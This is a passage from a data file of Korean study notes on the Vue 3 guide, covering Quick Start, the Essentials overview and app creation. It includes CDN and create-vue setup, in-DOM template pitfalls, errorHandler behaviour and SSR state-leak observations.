            body: "(1) 빌드 없는 입구(CDN의 vue.global.js 또는 esm-browser.js)에 Options API가 문서의 추천입니다. '빌드 도구를 쓰지 않거나 복잡도가 낮은 시나리오(점진적 강화)'. 폼 컨테이너 하나에 createApp을 mount하면 페이지의 나머지는 건드리지 않습니다. in-DOM 템플릿을 쓰게 되니 소문자 태그와 닫는 태그를 지킵니다. (2) 구조 분해는 그 순간의 문자열을 복사합니다. 이후 form.email이 바뀌어도 email 변수는 프록시를 거치지 않아 기록이 없습니다. 실제로 돌려 보면 구조 분해한 값은 바뀌어도 효과가 돌지 않았습니다. form.email로 읽거나 toRefs(form)의 email(ref)을 씁니다. (3) 상태 변경은 묶여 다음 틱에 DOM에 반영됩니다. 실제로 set 직후 DOM은 옛 값이었습니다. await nextTick() 뒤에 재거나, 그 갱신 뒤를 보는 watch(…, { flush: 'post' })·onUpdated에서 잽니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Introduction", href: `${DOCS}/guide/introduction` },
      { label: "소개 (한국어)", href: `${KO}/guide/introduction.html` },
      { label: "Reactivity Fundamentals", href: `${DOCS}/guide/essentials/reactivity-fundamentals` },
    ],
  },

  {
    id: "vg-start-quick",
    name: "빠른 시작",
    tagline: "create-vue 로, 또는 CDN 으로 — 그리고 HTML 파서가 먼저 읽는 템플릿의 규칙",
    intro:
      "가이드 둘째 페이지입니다. 두 길을 적습니다. 빌드 도구로: Node ^22.18.0 || >=24.12.0에서 npm create vue@latest(create-vue가 TS·Router·Pinia·Vitest 등을 묻고 Vite 프로젝트를 만듦), npm run dev, npm run build → ./dist. 빌드 없이: CDN의 vue.global.js(전역 Vue), vue.esm-browser.js(<script type=\"module\">), 임포트 맵(Safari 16.4+). 주의 셋. CDN에서는 SFC를 못 쓴다, 예제는 개발 빌드다(운영은 .prod.js), ES 모듈은 file://에서 안 돈다(npx serve). 실제로 돌려 보면 개발 빌드는 575,931바이트, 운영은 177,765바이트였고, HTML 안에 직접 쓴 템플릿(in-DOM)은 브라우저 파서가 먼저 손을 대 <MyRow>가 소문자가 되고 <my-row/>가 뒤 형제를 삼켰습니다. 이 노드의 질문은 하나입니다. 어느 입구를 고르고, 그 입구의 규칙은 무엇인가.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "빌드 도구 길: 'npm create vue@latest'(pnpm·yarn·bun 변형 있음)가 create-vue를 실행해 프로젝트 이름과 선택지(TypeScript, JSX, Vue Router, Pinia, Vitest, E2E, ESLint, Prettier)를 묻고 Vite 기반 프로젝트를 만듭니다. cd → npm install → npm run dev. 배포는 npm run build로 ./dist. IDE는 VS Code + Vue - Official 확장. CDN 길: 전역 빌드 <script src=\"…/vue.global.js\">는 window.Vue를 만들고 Vue.createApp({…}).mount('#app'). ES 모듈 빌드는 <script type=\"module\">import { createApp, ref } from '…/vue.esm-browser.js'</script>. 임포트 맵은 <script type=\"importmap\">으로 'vue'를 CDN 주소에 매핑해 import … from 'vue'를 그대로 쓰게 합니다(Safari 16.4+). 모듈을 파일로 나눌 때는 HTTP로 서빙해야 하고(file:// 불가) 'Notes on Production Use'는 개발 빌드를 운영에 쓰지 말라고 적습니다. 대안으로 petite-vue를 언급합니다.",
        code: "# 1. 빌드 도구 길\nnpm create vue@latest\n  ✔ Project name: … ✔ Add TypeScript? ✔ Add Vue Router? ✔ Add Pinia? ✔ Add Vitest? ✔ Add ESLint? …\ncd <project> && npm install && npm run dev      # Vite 개발 서버\nnpm run build                                    # → ./dist\n\n<!-- 2. CDN — 전역 빌드 -->\n<script src=\"https://unpkg.com/vue@3/dist/vue.global.js\"></script>\n<div id=\"app\">{{ message }}</div>\n<script>const { createApp, ref } = Vue; createApp({ setup() { return { message: ref('Hello') } } }).mount('#app')</script>\n\n<!-- 3. CDN — ES 모듈 + 임포트 맵 (Safari 16.4+) -->\n<script type=\"importmap\">{ \"imports\": { \"vue\": \"https://unpkg.com/vue@3/dist/vue.esm-browser.js\" } }</script>\n<script type=\"module\">import { createApp, ref } from 'vue'; createApp({ setup() { return { message: ref('Hello') } } }).mount('#app')</script>\n\n# 모듈을 파일로 나누면 file:// 불가 → npx serve",
        codeLang: "text",
        terms: [
          {
            term: "create-vue",
            body: "Vue 팀의 공식 프로젝트 생성기입니다. npm create vue@latest가 이것을 받아 실행합니다. Vite 기반이고 선택지를 묻는 식입니다. 예전의 Vue CLI(webpack)는 유지 관리 모드이고 문서는 새 프로젝트에 Vite를 권합니다. 생성된 프로젝트는 런타임 전용 Vue 빌드를 쓰고 템플릿은 빌드 때 컴파일됩니다.",
          },
          {
            term: "in-DOM 템플릿 (in-DOM template)",
            body: "HTML 문서 안에 직접 쓴 템플릿입니다. 마운트 컨테이너의 innerHTML을 Vue가 템플릿으로 읽습니다. 브라우저의 HTML 파서를 먼저 거치므로 HTML의 규칙이 적용됩니다. 태그·속성은 소문자가 되고, 자기 닫힘(<my-comp/>)은 인식되지 않고, <table> 안에는 <tr>만 올 수 있어 컴포넌트가 밖으로 끌려 나옵니다. 그래서 kebab-case 태그, 명시적 닫는 태그, <tr is=\"vue:my-row\">가 필요합니다. SFC·문자열 템플릿·<script type=\"text/x-template\">에는 해당 없습니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "vue 3.5.45 패키지의 dist에서 브라우저 빌드 둘을 재니 vue.esm-browser.js 575,931바이트(개발, 컴파일러 포함), vue.esm-browser.prod.js 177,765바이트(운영)였습니다. 개발 빌드는 경고 문구와 검증 코드와 템플릿 컴파일러가 들어 있습니다. Chrome에서 컨테이너 innerHTML을 템플릿으로 쓰는 in-DOM 방식을 시험했습니다. <my-row></my-row>는 됐고, <MyRow></MyRow>는 파서가 <myrow>로 바꿔 'Failed to resolve component: myrow', <my-row/>는 파서가 자기 닫힘을 무시해 열린 태그로 보고 뒤의 <span id=\"after\">와 <table>을 전부 그 안에 넣었습니다. 그 결과 렌더에서 span과 table이 사라졌습니다(MyRow 템플릿에 slot이 없으니 자식은 버려짐). <table> 안의 <my-row>는 table 밖으로 끌려 나왔고 <tr is=\"vue:my-row\">만 제자리에 남았습니다. 템플릿 안의 전역 접근도 봤습니다. {{ Math.max(1, 2) }}는 되지만 {{ typeof performance }}, {{ typeof window }}는 허용 목록 밖이라 undefined입니다. {{ performance.now() }}는 'render function' 단계의 에러로 errorHandler에 왔습니다.",
        code: "// 파서가 먼저 읽는 in-DOM 템플릿 (Chrome 156)\n<my-row></my-row>          → 됨\n<MyRow></MyRow>            → <myrow></myrow>  + warn: Failed to resolve component: myrow\n<my-row/>                  → <my-row> … (닫히지 않음) → 뒤의 <span>·<table> 이 자식으로 → 렌더에서 사라짐\n<table><my-row></my-row>   → table 밖으로 끌려 나옴\n<tr is=\"vue:my-row\">       → 제자리에서 컴포넌트 ✓\n\n// 템플릿의 전역 허용 목록\n{{ Math.max(1, 2) }}      → 2\n{{ typeof performance }}  → undefined   {{ typeof window }} → undefined   (허용 목록 밖 · app.config.globalProperties 로 추가)\n{{ performance.now() }}   → errorHandler(info: 'render function', TypeError)",
        codeLang: "text",
      },
      {
        label: "문제: CDN 으로 붙인 페이지에서 컴포넌트 뒤의 내용이 사라진다",
        body: "레거시 페이지에 <script src=\"vue.global.js\">로 Vue를 붙이고 HTML에 <product-card/><p>설명</p>을 적었습니다. 카드는 나오는데 설명이 사라집니다. 브라우저 파서는 커스텀 태그의 자기 닫힘을 모릅니다. <product-card>를 열린 태그로 보고 <p>설명</p>을 그 자식으로 넣습니다. Vue는 그 innerHTML을 템플릿으로 받아 product-card 컴포넌트를 렌더하는데, 자식은 slot이 없으면 버려집니다. 실제로 돌려 보면 <my-row/> 뒤의 span과 table이 그렇게 사라졌습니다. 처방은 in-DOM 템플릿의 규칙을 따르는 것입니다. <product-card></product-card>로 닫고, 태그는 kebab-case로, 테이블 안에는 <tr is=\"vue:product-row\">. 또는 템플릿을 HTML에 두지 않고 template 옵션 문자열이나 SFC로 옮기면 파서를 거치지 않습니다.",
      },
      {
        label: "문제가 나는 경우: 입구의 규칙을 모를 때",
        body: "경우 ㄱ, 자기 닫힘 컴포넌트입니다. 위의 사고입니다. 경우 ㄴ, PascalCase 태그입니다. 소문자가 되어 못 찾습니다. kebab-case로. 경우 ㄷ, <table> 안의 컴포넌트입니다. 밖으로 끌려 나옵니다. is=\"vue:…\". 경우 ㄹ, 개발 빌드를 운영에 올립니다. 575KB와 경고 코드가 그대로 갑니다. .prod.js로. 경우 ㅁ, file://로 모듈을 엽니다. CORS로 안 돕니다. HTTP 서버로. 경우 ㅂ, 임포트 맵을 옛 Safari에서 씁니다. 16.4 전은 미지원. 경우 ㅅ, CDN에서 .vue 파일을 import합니다. SFC는 컴파일이 필요합니다. 빌드 도구로. 경우 ㅇ, 템플릿에서 window·performance·localStorage를 읽습니다. 허용 목록 밖이라 undefined. app.config.globalProperties에 넣거나 setup에서 꺼내 반환. 경우 ㅈ, Node 버전이 낮습니다. create-vue가 Node ^22.18.0 || >=24.12.0을 요구합니다. 경우 ㅊ, Vue CLI로 새 프로젝트를 시작합니다. 유지 관리 모드. create-vue(Vite)로. 경우 ㅋ, 임포트 맵 없이 'vue'를 import합니다. 브라우저가 베어 모듈 지정자를 못 풉니다. 전체 URL 또는 임포트 맵.",
        code: "경우               언제 생기나                       겉모습                                처방\nㄱ 자기 닫힘        <my-comp/> in HTML                 뒤 형제가 사라짐 (실제로)                <my-comp></my-comp>\nㄴ PascalCase       <MyComp> in HTML                   Failed to resolve component: mycomp     <my-comp>\nㄷ table 안         <table><my-row>                    밖으로 끌려 나옴                        <tr is=\"vue:my-row\">\nㄹ 개발 빌드 운영     vue.global.js 그대로                575KB · 경고 코드                       .prod.js\nㅁ file://          로컬 파일로 모듈                     CORS 에러                              npx serve\nㅂ 옛 Safari        importmap                          미지원 (< 16.4)                        전체 URL import\nㅅ CDN 에 .vue      import './X.vue'                   컴파일 안 됨                           빌드 도구\nㅇ 템플릿 전역       {{ window.x }}                     undefined · 에러                       globalProperties · setup 반환\nㅈ Node 낮음        create vue                         실패                                  Node 22.18+ / 24.12+\nㅊ Vue CLI          새 프로젝트                        유지 관리 모드                          create-vue\nㅋ 베어 지정자       import 'vue' (맵 없음)              Failed to resolve module specifier     importmap · URL",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 빌드가 없다는 것은 '컴파일러와 파서를 런타임에 둔다' 는 뜻이다",
        body: "빌드 도구 길은 .vue를 빌드 때 컴파일합니다. 템플릿을 Vue가 먼저 읽고, 운영 번들에는 런타임만 들어가고, 모듈 지정자는 번들러가 풉니다. CDN 길은 그 셋을 런타임과 브라우저에 맡깁니다. 템플릿은 HTML 파서가 먼저 읽어 HTML 규칙을 받고(ㄱ, ㄴ, ㄷ), 컴파일러가 브라우저 빌드에 들어가 크고(ㄹ), 모듈 지정자는 브라우저가 풀어야 해서 URL이나 임포트 맵이 필요하고 file://가 막힙니다(ㅁ, ㅂ, ㅋ). SFC는 컴파일 산물이라 CDN에 없습니다(ㅅ). 그래서 빠른 시작의 두 길은 '편의'의 차이가 아니라 '누가 어디서 무엇을 읽나'의 차이이고, 그 차이가 규칙 목록이 됩니다.",
        code: "                 템플릿을 읽는 쪽         컴파일러 위치            모듈 지정자 해석\n빌드 도구 (create-vue)   Vue 컴파일러 (빌드 때)    빌드 도구에                번들러            → HTML 규칙 무관 · 런타임 전용 빌드 · 'vue' 그대로\nCDN                    HTML 파서 → Vue          브라우저 빌드 안 (575KB)   브라우저          → 소문자·닫는 태그·table (ㄱㄴㄷ) · 크다 (ㄹ) · URL·importmap·HTTP (ㅁㅂㅋ) · SFC 없음 (ㅅ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "다음 장 '필수 개념'의 첫 페이지 '애플리케이션 생성'은 createApp·mount·app.config입니다. 실제로 돌려 보면 mount를 두 번 부르면 'App has already been mounted.' 경고였고, errorHandler의 셋째 인자 info가 'setup function', 'render function'처럼 어디서 났는지를 말했습니다.",
      },
      {
        label: "확인 질문",
        body: "마케팅 랜딩 페이지(정적 HTML, 백엔드 템플릿)에 가격 계산기 위젯 하나를 Vue로 넣습니다. (1) 어느 입구? (2) 위젯 템플릿을 HTML에 직접 쓸 때 지킬 것 셋? (3) 운영에 올릴 때 바꿀 것?",
        notes: [
          {
            title: "답",
            body: "(1) 빌드 없는 CDN 길이 맞습니다. 페이지 전체를 SPA로 바꾸는 것이 아니라 위젯 하나를 점진적으로 강화하는 자리입니다. <script type=\"module\">에 vue.esm-browser.js를 import하거나 전역 빌드를 쓰고, 계산기 컨테이너에만 mount합니다. (2) in-DOM 템플릿의 규칙. 컴포넌트 태그는 kebab-case(<price-row>), 자기 닫힘 금지(<price-row></price-row>), 테이블 안 컴포넌트는 <tr is=\"vue:price-row\">. 실제로 돌려 보면 <my-row/>가 뒤 형제를 삼키고 <MyRow>는 소문자로 바뀌었습니다. 템플릿에서 window 같은 전역은 못 읽으니 setup에서 계산해 반환합니다. (3) 개발 빌드(vue.esm-browser.js, 575,931바이트)를 운영 빌드(vue.esm-browser.prod.js, 177,765바이트)로 바꿉니다. 경고와 검증 코드가 빠집니다. 모듈을 파일로 나눴다면 HTTP로 서빙되는지(file:// 아님) 확인합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Quick Start", href: `${DOCS}/guide/quick-start` },
      { label: "빠른 시작 (한국어)", href: `${KO}/guide/quick-start.html` },
      { label: "Components Basics — in-DOM Template Parsing Caveats", href: `${DOCS}/guide/essentials/component-basics#in-dom-template-parsing-caveats` },
      { label: "Tooling", href: `${DOCS}/guide/scaling-up/tooling` },
    ],
  },

  {
    id: "vg-essentials",
    name: "필수 개념",
    tagline: "값을 만들고(반응성), 화면에 붙이고(바인딩·렌더링), 화면에서 값으로 돌아오는(이벤트·폼) 열세 페이지",
    intro:
      "가이드의 둘째 장, 열세 페이지입니다. 애플리케이션 생성, 템플릿 문법, 반응성 기초, 계산된 속성, 클래스와 스타일 바인딩, 조건부 렌더링, 리스트 렌더링, 이벤트 처리, 폼 입력 바인딩, 감시자, 템플릿 ref, 컴포넌트 기초, 라이프사이클 훅. 순서가 곧 모델입니다. 앱을 만들고(1), 템플릿이 값을 어떻게 읽는지(2), 값은 어떻게 만드는지(3~4), 값을 class·style·조건·리스트로 어떻게 붙이는지(5~7), 화면에서 값으로 어떻게 돌아오는지(8~9), 값의 변화를 어떻게 지켜보는지(10), DOM을 직접 만져야 할 때(11), 그리고 이 전부를 컴포넌트로 묶고(12) 시간 축에 놓는 것(13). 실제로 돌려 보면 이 장의 사고는 거의 전부 '추적은 읽는 순간에만'과 'DOM 갱신은 다음 틱에 묶여서'로 설명됐습니다.",
    blocks: [
      {
        label: "열세 페이지 한눈에",
        body: "페이지마다 핵심 한 줄과 실제로 돌려 본 사고 하나를 붙였습니다.",
        code: "페이지              핵심 한 줄                                            실제로 돌려 본 것\n1 애플리케이션 생성    createApp → config → mount (한 번) · 컨테이너 안을 갈아 끼움      mount 두 번 → 'App has already been mounted.' · errorHandler info 'setup function' · 'render function'\n2 템플릿 문법         {{ }} 는 텍스트 · 식 하나 · 전역은 허용 목록만                     {{ typeof window }} → undefined + 'Property \"window\" was accessed during render but is not defined on instance.'\n3 반응성 기초         ref 는 .value · reactive 는 객체만 · 구조 분해·교체 금지 · 풀림은 최상위만   {{ obj.id + 1 }} → '[object Object]1' · reactive(1) 경고 · 배열 안 ref 안 풀림\n4 계산된 속성         지연 · 캐시 · 읽기 전용 · 부수효과 금지                           읽기 전 runs 0 · 두 번 읽어도 1 · 쓰기 → 'computed value is readonly' · 안의 sort() 가 원본 변경\n5 클래스·스타일       객체·배열 문법 · 단일 루트에 병합 · 다중 루트는 $attrs.class            class 'base extra' 병합 · 다중 루트 → 'Extraneous non-props attributes (class)…'\n6 조건부 렌더링       v-if 는 제거 · v-show 는 display · v-else 는 바로 뒤                 v-if false → 제거됨 · v-show → display: none · 같은 key 분기 → 컴파일 에러\n7 리스트 렌더링       key 는 정체 · 변이 메서드 추적 · v-if 가 v-for 보다 먼저               key 바꾸면 input 값 리셋 · KEYED_FRAGMENT 128 · computed 안 sort 가 원본 변경\n8 이벤트 처리         수식어는 순서대로 · .exact · 키 별칭                              .prevent.self 자식 클릭 → 막힘 / .self.prevent → 안 막힘 · .once 한 번 · page-down 됨\n9 폼 입력 바인딩      v-model 은 초기 속성 무시 · .lazy .number .trim · select 불일치         value=\"속성값\" 무시 → '' · '12abc' → 12 · 'abc' → 'abc' · selectedIndex -1\n10 감시자            watch 는 소스, watchEffect 는 자동 · flush pre/post/sync · 정리           sync → 동기 끝 → pre(옛 DOM) → post(새 DOM) · await 뒤 미추적 · ref([]) push 미감지\n11 템플릿 ref        마운트 뒤에만 · v-for 는 배열 · 컴포넌트는 expose 만                   setup·beforeMount null → mounted INPUT · child.secret undefined\n12 컴포넌트 기초      props 내려 · emit 올려 · slot · <component :is> · in-DOM 함정           검증 경고 셋 · Boolean 캐스팅 · <my-row/> 가 뒤를 삼킴\n13 라이프사이클 훅     setup → beforeMount → (자식) → mounted · 동기 등록                 부모 setup → 부모 beforeMount → 자식 setup·beforeMount·mounted → 부모 mounted",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 두 축 — '읽는 순간' 과 '다음 틱'",
        body: "열세 페이지의 사고는 두 축에 놓입니다. 추적 축: 반응성(3)·computed(4)·감시자(10)의 사고는 '읽는 길이 프록시를 지났나'입니다. 구조 분해, 배열 안 ref, await 뒤, 비반응형 소스(Date.now). 시간 축: 애플리케이션(1)·템플릿 ref(11)·라이프사이클(13)·감시자의 flush(10)·폼(9)의 사고는 'DOM이 언제 바뀌나'입니다. 마운트 전엔 null, 갱신은 다음 틱, pre는 옛 DOM·post는 새 DOM, 같은 틱의 변경은 묶임. 나머지(2, 5~8, 12)는 템플릿이 HTML과 다른 자리입니다. 허용 목록, class 병합, v-if 우선, 수식어 순서, in-DOM 파서. 자식 열셋이 각각을 다룹니다.",
        code: "추적 축 (읽는 길)      3 반응성 · 4 computed · 10 감시자            구조 분해 · 배열 안 ref · await 뒤 · Date.now\n시간 축 (다음 틱)      1 앱 · 9 폼 · 10 flush · 11 ref · 13 라이프사이클    마운트 전 null · 묶음 · pre/post · 동기 등록\n템플릿 ≠ HTML         2 문법 · 5 class · 6 조건 · 7 리스트 · 8 이벤트 · 12 in-DOM   허용 목록 · 병합 · v-if 우선 · 수식어 순서 · 파서",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 '애플리케이션 생성'부터 순서대로입니다.",
      },
    ],
    sources: [
      { label: "Essentials — Creating an Application", href: `${DOCS}/guide/essentials/application` },
      { label: "Essentials — Lifecycle Hooks", href: `${DOCS}/guide/essentials/lifecycle` },
    ],
  },

  {
    id: "vg-ess-app",
    name: "애플리케이션 생성",
    tagline: "createApp → config → mount(한 번): 앱 인스턴스가 하는 일과 에러가 모이는 곳",
    intro:
      "필수 개념 첫 페이지입니다. createApp(RootComponent)으로 앱 인스턴스를 만들고, 앱 수준 설정(app.config.errorHandler, globalProperties)과 자산 등록(app.component, app.directive, app.use)을 한 뒤, app.mount('#app')로 DOM에 붙입니다. 문서의 규칙은 '모든 설정과 등록은 mount 전에', 'mount는 앱마다 한 번', 'mount는 루트 컴포넌트 인스턴스를 돌려준다(앱 인스턴스가 아님)', '컨테이너 자체는 앱의 일부가 아니다', '한 페이지에 여러 앱을 둘 수 있다'. 실제로 돌려 보면 mount를 두 번 부르니 'App has already been mounted.' 경고였고, errorHandler의 셋째 인자 info는 setup에서 던지면 'setup function', 렌더에서 던지면 'render function'이었으며, 중간 컴포넌트의 onErrorCaptured가 false를 돌려주면 errorHandler까지 오지 않았습니다. 이 노드의 질문은 하나입니다. 앱 인스턴스는 무엇을 담는 그릇인가.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "import { createApp } from 'vue'; const app = createApp(App). 루트 컴포넌트는 옵션 객체이거나 import한 SFC. 자식 컴포넌트는 그 아래 트리. app.mount('#app')는 선택자나 요소를 받아 그 안에 렌더하고(컨테이너 안의 기존 내용은 교체) 루트 컴포넌트 인스턴스를 돌려줍니다. 루트에 template·render가 없으면 컨테이너의 innerHTML을 템플릿으로 씁니다(in-DOM). app.config는 mount 전에 바꾸는 설정 객체. errorHandler(err, instance, info)는 '모든 하위 컴포넌트에서 올라온 에러'를 받고, info는 어디서 났는지(컴포넌트 렌더, 이벤트 핸들러, 라이프사이클 훅, setup, 감시자, 커스텀 디렉티브 훅, Transition 훅)를 말하며 운영에서는 짧은 코드가 됩니다. globalProperties는 모든 템플릿에서 읽을 수 있는 전역(Vue 2의 Vue.prototype 대체, '드물게'). app.component·app.directive·app.use·app.provide는 앱 전체 자산이고 체이닝됩니다. 여러 앱 인스턴스는 각자 설정과 자산을 가지며, 서버 렌더 페이지의 일부만 강화할 때 작은 앱을 여러 요소에 마운트하는 것이 권장입니다.",
        code: "import { createApp } from 'vue'\nimport App from './App.vue'\n\nconst app = createApp(App)\n\n// 설정과 등록은 mount 전에\napp.config.errorHandler = (err, instance, info) => { report(err, info) }   // info: 'setup function' · 'render function' · 'native event handler' · 'watcher callback' …\napp.config.globalProperties.$fmt = (n) => n.toLocaleString('ko-KR')       // 템플릿 어디서나 {{ $fmt(price) }}\napp.component('BaseButton', BaseButton).directive('focus', focusDirective).use(router)\n\nconst root = app.mount('#app')   // ← 루트 컴포넌트 인스턴스 (앱 인스턴스 아님) · 한 번만\n\n// 여러 앱 — 각자 설정·자산\ncreateApp(Widget).mount('#widget-a'); createApp(Other).mount('#widget-b')",
        terms: [
          {
            term: "앱 인스턴스 (app instance)와 루트 컴포넌트 인스턴스",
            body: "createApp이 돌려주는 것이 앱 인스턴스입니다. 설정(config)과 앱 전체 자산(컴포넌트·디렉티브·플러그인·provide)의 그릇이고, mount·unmount를 가집니다. app.mount가 돌려주는 것은 루트 컴포넌트 인스턴스로, this에 해당하는 공개 프록시입니다. 둘을 혼동해 mount의 반환값에 .component를 부르면 없습니다. 자산 등록은 앱 인스턴스를 돌려주므로 체이닝은 등록 메서드에서만 됩니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 app.mount(el)을 한 뒤 다른 요소에 다시 mount하니 던지지 않고 '[Vue warn]: App has already been mounted.' 경고만 났습니다. errorHandler: 루트에 Guard 컴포넌트(onErrorCaptured가 false 반환)를 두고 그 안의 Boom이 이벤트 핸들러·감시자·렌더에서 던지게 하니 Guard가 'handler 폭발', 'watcher 폭발', 'Cannot read properties of undefined (reading 'x')'를 전부 잡고 errorHandler에는 아무것도 오지 않았습니다. false가 전파를 끊습니다. Guard 없이 setup에서 던지면 errorHandler에 info 'setup function', 템플릿에서 performance.now()를 부르면 'render function'이 왔습니다. 자산 등록의 범위도 봤습니다. app.directive('dir', …)로 전역 등록한 디렉티브는 자식 템플릿에서 쓰였지만, 부모 컴포넌트의 directives 옵션에 등록한 것은 자식에서 'Failed to resolve directive: local'이었습니다. 로컬 등록은 그 컴포넌트 템플릿에서만입니다. 렌더 함수에서 등록 안 된 이름을 resolveComponent하니 'Failed to resolve component: Nope'와 함께 <Nope></Nope>가 그대로 나왔습니다. useId는 app.config.idPrefix = 'app'으로 'app-0', 'app-1'이 됐습니다(기본은 'v-0'). 서버에서 createSSRApp + renderToString은 같은 앱 정의로 한 요청에 한 앱을 만들었을 때 모듈 전역 reactive가 요청 사이에 누적됐습니다(shared=1 → 2). 앱은 요청마다 새로 만들되 모듈 전역은 공유된다는 뜻입니다.",
        code: "// Chrome 156 · vue 3.5.45\napp.mount(el); app.mount(el2)      → warn: App has already been mounted.   (던지지 않음)\n\nerrorHandler = (err, inst, info) => …\n  setup 에서 throw                 → info 'setup function'\n  템플릿 {{ performance.now() }}    → info 'render function' · TypeError: Cannot read properties of undefined (reading 'now')\n  중간에 onErrorCaptured(() => false)  → errorHandler 에 아무것도 안 옴 (전파 차단) · 핸들러·감시자·렌더 에러 전부 거기서 잡힘\n\napp.directive('dir', …)          → 자식 템플릿에서 v-dir ✓ (전역)\n부모 { directives: { local } }     → 자식에서 v-local ✗ 'Failed to resolve directive: local' (로컬은 그 템플릿만)\nresolveComponent('Nope')          → warn 'Failed to resolve component: Nope' · <Nope></Nope> 그대로\napp.config.idPrefix = 'app'       → useId() 'app-0' 'app-1'  (기본 'v-0')\n\n// Node — 요청마다 createSSRApp 해도 모듈 전역은 공유\nconst shared = reactive({ n: 0 })  (모듈)   요청 1: shared=1 · 요청 2: shared=2",
      },
      {
        label: "문제: 운영에서 에러가 콘솔에만 남고 모니터링에 안 간다",
        body: "컴포넌트 어딘가가 렌더 중 던졌습니다. 개발에서는 콘솔에 빨간 줄이 뜨고 운영에서는 조용히 그 컴포넌트가 빈 채로 남습니다. Vue는 기본으로 개발에서 다시 던지고 운영에서는 로그만 남깁니다. 처방은 createApp 직후, mount 전에 app.config.errorHandler를 달아 모니터링에 보내는 것입니다. 셋째 인자 info가 'render function'·'setup function'·'native event handler'·'watcher callback'처럼 어디서 났는지를 말해 주므로(운영에서는 짧은 코드, 문서의 Production Error Code Reference로 복원) 함께 보냅니다. 실제로 돌려 보면 setup과 render의 info가 그렇게 왔습니다. 부분 장애를 그 자리에서 대체 UI로 바꾸려면 중간 컴포넌트에 onErrorCaptured를 두되, false를 돌려주면 errorHandler까지 가지 않으니 모니터링도 거기서 해야 합니다. Sentry·Bugsnag에 Vue 통합이 있습니다. app.config.throwUnhandledErrorInProduction = true면 운영에서도 던집니다.",
      },
      {
        label: "문제가 나는 경우: 앱 인스턴스의 경계를 모를 때",
        body: "경우 ㄱ, errorHandler 없음입니다. 위의 사고입니다. 경우 ㄴ, mount 뒤에 설정합니다. 이미 렌더된 뒤라 적용되지 않습니다. 문서: '모든 설정은 mount 전에'. 경우 ㄷ, mount 반환값을 앱으로 씁니다. 루트 컴포넌트 인스턴스라 .component가 없습니다. 경우 ㄹ, mount를 두 번 부릅니다. 경고와 함께 무시됩니다(실제로). 경우 ㅁ, 로컬 등록한 컴포넌트·디렉티브를 자식에서 쓰려 합니다. 그 템플릿에서만입니다(실제로 'Failed to resolve directive'). 전역은 app.component/app.directive. 경우 ㅂ, 전역 등록을 남발합니다. 트리 셰이킹이 안 되고 의존이 숨습니다. <script setup>의 import가 기본. 경우 ㅅ, globalProperties에 상태를 넣습니다. 반응형이 아니고 어디서 왔는지 숨습니다. '드물게'. provide/inject나 스토어로. 경우 ㅇ, onErrorCaptured에서 false를 돌려주고 모니터링을 잊습니다. errorHandler에 안 옵니다(실제로). 경우 ㅈ, SSR에서 모듈 전역 상태를 씁니다. 요청 사이에 샙니다(실제로 shared 누적). 요청마다 만들어 provide. 경우 ㅊ, 컨테이너에 서버 렌더 HTML이 있는데 createApp입니다. 지우고 다시 그립니다. createSSRApp(하이드레이션). 경우 ㅋ, 전체 페이지를 한 앱으로 감쌉니다. 서버 템플릿 페이지를 점진적으로 강화할 때는 요소마다 작은 앱이 문서의 권장입니다. 경우 ㅌ, 두 앱의 useId가 겹칩니다. idPrefix로 가릅니다(실제로 'app-0').",
        code: "경우               언제 생기나                         겉모습                                처방\nㄱ errorHandler 없음  운영 에러                           조용히 빈 컴포넌트                      mount 전 errorHandler + info\nㄴ mount 뒤 설정      app.mount 뒤 config                 적용 안 됨                            설정 → mount\nㄷ 반환값 혼동        app.mount(…).component              undefined                            app 변수에서\nㄹ mount 두 번       재마운트                            warn: App has already been mounted.    unmount 뒤 새 앱\nㅁ 로컬을 자식에서     부모 directives/components 옵션        Failed to resolve …                   그 템플릿만 · 전역은 app.*\nㅂ 전역 남발         app.component 수십 개                트리 셰이킹 X · 의존 숨음                 import\nㅅ 전역 상태         globalProperties.state              비반응 · 출처 불명                      provide · 스토어\nㅇ false 뒤 침묵      onErrorCaptured false                errorHandler 미호출 (실제로)              그 자리에서 보고\nㅈ SSR 모듈 전역      reactive 를 모듈에                   요청 간 누적 (실제로 1→2)                요청마다 생성 · provide\nㅊ SSR HTML 에 createApp  하이드레이션 대신                 다시 그림                             createSSRApp\nㅋ 페이지 전체 한 앱    서버 템플릿 강화                     충돌                                  요소마다 작은 앱\nㅌ useId 충돌        앱 둘                               같은 id                               idPrefix",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 앱 인스턴스는 '트리 전체에 적용되는 것' 의 그릇이고, 그 밖은 흐른다",
        body: "앱 인스턴스가 담는 것은 트리 전체에 적용됩니다. 설정(errorHandler, globalProperties, compilerOptions), 전역 자산(component, directive, use, provide), 마운트 지점. 그래서 mount 전에 채워야 하고(ㄴ), 한 번만 붙고(ㄹ), 전역 등록은 트리 전부에 보이되 비용이 있습니다(ㅂ). 반대로 컴포넌트 안의 로컬 등록은 그 템플릿에서만이고(ㅁ), 에러는 트리를 따라 위로 흐르다 errorHandler에 모이되 중간에서 끊을 수 있습니다(ㅇ). 그리고 앱 인스턴스가 담지 '않는' 것이 모듈 전역입니다. 요청마다 앱을 새로 만들어도 모듈 전역은 공유되어 SSR에서 샙니다(ㅈ). 처방은 '트리 전체에 적용되나'를 기준으로 앱 수준(config·app.*)과 컴포넌트 수준(로컬·provide)과 모듈 수준(공유, 피할 것)을 가르는 것입니다.",
        code: "모듈 전역        reactive · 상수 … → 모든 앱 · 모든 요청이 공유 (SSR 오염 ㅈ)\n  └ 앱 인스턴스   config (errorHandler · globalProperties) · app.component/directive/use/provide → 그 트리 전부 · mount 전에 (ㄴ) · 한 번 (ㄹ)\n       └ 컴포넌트  components/directives 옵션 · provide → 그 템플릿 · 그 하위만 (ㅁ)\n            └ 에러  위로 흐름 → onErrorCaptured (false 면 멈춤 ㅇ) → errorHandler (ㄱ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
